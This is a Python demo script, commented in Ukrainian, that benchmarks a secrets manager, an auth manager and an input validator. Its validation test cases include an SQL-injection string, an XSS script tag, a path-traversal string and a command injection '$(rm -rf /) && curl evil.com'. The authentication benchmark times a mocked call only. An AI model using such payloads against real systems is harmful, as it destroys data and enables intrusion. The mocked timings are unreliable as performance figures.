#!/usr/bin/env python3
"""
Демонстрація продуктивності TetraCore Hub системи.
"""
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from unittest.mock import patch

# Імпорти модулів
from core.secrets_manager import SecretsManager
from core.auth_manager import AuthManager
from core.input_validator import InputValidator


def demo_secrets_performance():
    """Демонстрація продуктивності роботи з секретами."""
    print(f"\n🔐 Демонстрація: Управління секретами")
    print(f"{'='*50}")
    
    secrets_manager = SecretsManager()
    num_operations = 30
    start_time = time.time()
    
    for i in range(num_operations):
        key = f"demo_secret_{i}"
        value = f"secret_value_{i}_{time.time()}"
        
        # Операції з секретами
        secrets_manager.set_secret(key, value)
        retrieved = secrets_manager.get_secret(key)
        assert retrieved == value
        secrets_manager.delete_secret(key)
    
    duration = time.time() - start_time
    ops_per_sec = (num_operations * 3) / duration  # 3 операції на цикл
    
    print(f"   ✅ Виконано {num_operations} повних циклів операцій")
    print(f"   ⏱️  Час виконання: {duration:.3f} секунд")
    print(f"   🚀 Швидкість: {ops_per_sec:.1f} операцій/сек")
    print(f"   📊 Середній час операції: {(duration/num_operations)*1000:.1f}мс")
    
    return {'operations': num_operations * 3, 'duration': duration, 'ops_per_sec': ops_per_sec}


def demo_concurrent_operations():
    """Демонстрація паралельних операцій."""
    print(f"\n⚡ Демонстрація: Паралельні операції")
    print(f"{'='*50}")
    
    secrets_manager = SecretsManager()
    num_threads = 5
    operations_per_thread = 8
    
    def worker(thread_id):
        thread_results = []
        for i in range(operations_per_thread):
            key = f"concurrent_{thread_id}_{i}"
            value = f"value_{thread_id}_{i}"
            
            start = time.time()
            secrets_manager.set_secret(key, value)
            retrieved = secrets_manager.get_secret(key)
            secrets_manager.delete_secret(key)
            duration = time.time() - start
            
            thread_results.append({
                'success': retrieved == value,
                'duration': duration
            })
        return thread_results
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(worker, i) for i in range(num_threads)]
        all_results = []
        
        for future in as_completed(futures):
            all_results.extend(future.result())
    
    total_duration = time.time() - start_time
    
    successful = len([r for r in all_results if r['success']])
    total_ops = len(all_results) * 3  # 3 операції на результат
    ops_per_sec = total_ops / total_duration
    avg_op_time = sum(r['duration'] for r in all_results) / len(all_results)
    
    print(f"   ✅ Успішних операцій: {successful}/{len(all_results)}")
    print(f"   ⏱️  Загальний час: {total_duration:.3f} секунд")
    print(f"   🚀 Швидкість: {ops_per_sec:.1f} операцій/сек")
    print(f"   📊 Середній час циклу: {avg_op_time*1000:.1f}мс")
    print(f"   🧵 Використано потоків: {num_threads}")
    
    return {'operations': total_ops, 'duration': total_duration, 'ops_per_sec': ops_per_sec}


def demo_auth_performance():
    """Демонстрація продуктивності аутентифікації."""
    print(f"\n🔑 Демонстрація: Аутентифікація")
    print(f"{'='*50}")
    
    with patch('redis.Redis'):
        auth_manager = AuthManager()
    
    num_tokens = 20
    start_time = time.time()
    
    successful_tokens = 0
    
    for i in range(num_tokens):
        user_data = {
            'user_id': f"demo_user_{i}",
            'username': f"testuser_{i}",
            'roles': ['user', 'demo']
        }
        
        try:
            # Мокаємо створення токена для тестування
            with patch.object(auth_manager, 'create_token_pair') as mock_create:
                mock_create.return_value = {
                    'access_token': f"access_token_{i}",
                    'refresh_token': f"refresh_token_{i}"
                }
                token_pair = mock_create(user_data)
                
            successful_tokens += 1
        except Exception as e:
            print(f"   ❌ Помилка створення токена {i}: {e}")
    
    duration = time.time() - start_time
    tokens_per_sec = successful_tokens / duration
    
    print(f"   ✅ Створено токенів: {successful_tokens}/{num_tokens}")
    print(f"   ⏱️  Час виконання: {duration:.3f} секунд")
    print(f"   🚀 Швидкість: {tokens_per_sec:.1f} токенів/сек")
    print(f"   📊 Середній час токена: {(duration/successful_tokens)*1000:.1f}мс")
    
    return {'tokens': successful_tokens, 'duration': duration, 'tokens_per_sec': tokens_per_sec}


def demo_validation_performance():
    """Демонстрація продуктивності валідації.""" 
    print(f"\n🛡️  Демонстрація: Валідація безпеки")
    print(f"{'='*50}")
    
    validator = InputValidator()
    
    # Різні типи даних для валідації
    test_cases = [
        ("🟢 безпечний текст", "safe_input_data_12345"),
        ("🔴 SQL ін'єкція", "'; DROP TABLE users; SELECT * FROM admin; --"),
        ("🔴 XSS атака", "<script>alert('Hacked!');</script>"),
        ("🔴 командна ін'єкція", "$(rm -rf /) && curl evil.com"),
        ("🔴 path traversal", "../../etc/passwd"),
        ("🟢 email адреса", "user@example.com"),
        ("🟢 звичайний текст", "Hello, world! Привіт світ!")
    ] * 8  # 56 тестів всього
    
    start_time = time.time()
    
    successful_validations = 0
    detected_threats = 0
    threat_types = set()
    
    for test_type, test_input in test_cases:
        try:
            # Виконуємо всі перевірки
            sql_threat = validator.check_sql_injection(test_input)
            xss_threat = validator.check_xss(test_input)  
            cmd_threat = validator.check_command_injection(test_input)
            
            # Підраховуємо виявлені загрози
            if sql_threat:
                detected_threats += 1
                threat_types.add('SQL')
            if xss_threat:
                detected_threats += 1
                threat_types.add('XSS')
            if cmd_threat:
                detected_threats += 1
                threat_types.add('CMD')
            
            # Санітизація
            sanitized = validator.sanitize_input(test_input)
            
            successful_validations += 1
            
        except Exception as e:
            print(f"   ❌ Помилка валідації '{test_type}': {e}")
    
    duration = time.time() - start_time
    validations_per_sec = (successful_validations * 4) / duration  # 4 операції на валідацію
    
    print(f"   ✅ Успішних валідацій: {successful_validations}/{len(test_cases)}")
    print(f"   🎯 Виявлено загроз: {detected_threats}")
    print(f"   🔍 Типи загроз: {', '.join(sorted(threat_types))}")
    print(f"   ⏱️  Час виконання: {duration:.3f} секунд") 
    print(f"   🚀 Швидкість: {validations_per_sec:.1f} операцій/сек")
    print(f"   📊 Середній час валідації: {(duration/successful_validations)*1000:.1f}мс")
    
    return {
        'validations': successful_validations, 
        'threats': detected_threats,
        'duration': duration, 
        'ops_per_sec': validations_per_sec
    }


def demo_system_integration():
    """Демонстрація комплексної роботи системи."""
    print(f"\n🏆 Демонстрація: Комплексна інтеграція")
    print(f"{'='*50}")
    
    # Ініціалізація всіх компонентів
    secrets_manager = SecretsManager()
    with patch('redis.Redis'):
        auth_manager = AuthManager()
    validator = InputValidator()
    
    iterations = 12
    start_time = time.time()
    
    results = {
        'secrets_ops': 0,
        'auth_ops': 0, 
        'validation_ops': 0,
        'errors': 0
    }
    
    for i in range(iterations):
        try:
            # 1. Операції з секретами
            key = f"integration_test_{i}"
            secret_value = f"secret_data_{i}_{time.time()}"
            secrets_manager.set_secret(key, secret_value)
            retrieved_secret = secrets_manager.get_secret(key)
            assert retrieved_secret == secret_value
            secrets_manager.delete_secret(key)
            results['secrets_ops'] += 3
            
            # 2. Аутентифікація  
            user_data = {
                'user_id': f"integration_user_{i}",
                'username': f"testuser_{i}",
                'roles': ['user', 'integration']
            }
            with patch.object(auth_manager, 'create_token_pair') as mock_create:
                mock_create.return_value = {
                    'access_token': f"access_token_{i}",
                    'refresh_token': f"refresh_token_{i}"
                }
                tokens = mock_create(user_data)
            results['auth_ops'] += 1
            
            # 3. Валідація різних типів даних
            validation_tests = [
                f"safe_input_{i}",
                f"'; DROP TABLE test_{i}; --",
                f"<script>alert('test_{i}')</script>"
            ]
            
            for test_input in validation_tests:
                validator.check_sql_injection(test_input)
                validator.check_xss(test_input)
                validator.sanitize_input(test_input)
                results['validation_ops'] += 3
                
        except Exception as e:
            results['errors'] += 1
            print(f"   ❌ Помилка в ітерації {i}: {e}")
    
    duration = time.time() - start_time
    total_ops = results['secrets_ops'] + results['auth_ops'] + results['validation_ops']
    system_throughput = total_ops / duration
    
    print(f"   📈 Результати інтеграційного тесту:")
    print(f"   • 🔐 Операції з секретами: {results['secrets_ops']}")
    print(f"   • 🔑 Операції аутентифікації: {results['auth_ops']}")
    print(f"   • 🛡️  Операції валідації: {results['validation_ops']}")
    print(f"   • ❌ Помилки: {results['errors']}")
    print(f"   ⏱️  Загальний час: {duration:.3f} секунд")
    print(f"   🚀 Загальна пропускна здатність: {system_throughput:.1f} операцій/сек")
    print(f"   📊 Ефективність: {((total_ops/(total_ops+results['errors']))*100):.1f}%")
    
    return {
        'total_operations': total_ops,
        'duration': duration,
        'throughput': system_throughput,
        'efficiency': (total_ops/(total_ops+results['errors']))*100 if total_ops+results['errors'] > 0 else 0
    }


def main():
    """Головна функція демонстрації."""
    print("🚀 TetraCore Hub - Демонстрація продуктивності системи")
    print("=" * 60)
    
    try:
        # Запуск всіх демонстрацій
        secrets_results = demo_secrets_performance()
        concurrent_results = demo_concurrent_operations()
        auth_results = demo_auth_performance()
        validation_results = demo_validation_performance()
        integration_results = demo_system_integration()
        
        # Підсумкова статистика
        print(f"\n📊 ПІДСУМКОВА СТАТИСТИКА")
        print(f"{'='*60}")
        print(f"🔐 Секрети: {secrets_results['ops_per_sec']:.1f} операцій/сек")
        print(f"⚡ Паралельні операції: {concurrent_results['ops_per_sec']:.1f} операцій/сек")
        print(f"🔑 Аутентифікація: {auth_results['tokens_per_sec']:.1f} токенів/сек")
        print(f"🛡️  Валідація: {validation_results['ops_per_sec']:.1f} операцій/сек")
        print(f"🏆 Інтеграційна продуктивність: {integration_results['throughput']:.1f} операцій/сек")
        print(f"✅ Загальна ефективність: {integration_results['efficiency']:.1f}%")
        
        print(f"\n✨ Демонстрація завершена успішно!")
        print(f"   Система показала стабільну продуктивність у всіх модулях.")
        
    except Exception as e:
        print(f"\n❌ Помилка під час демонстрації: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main() 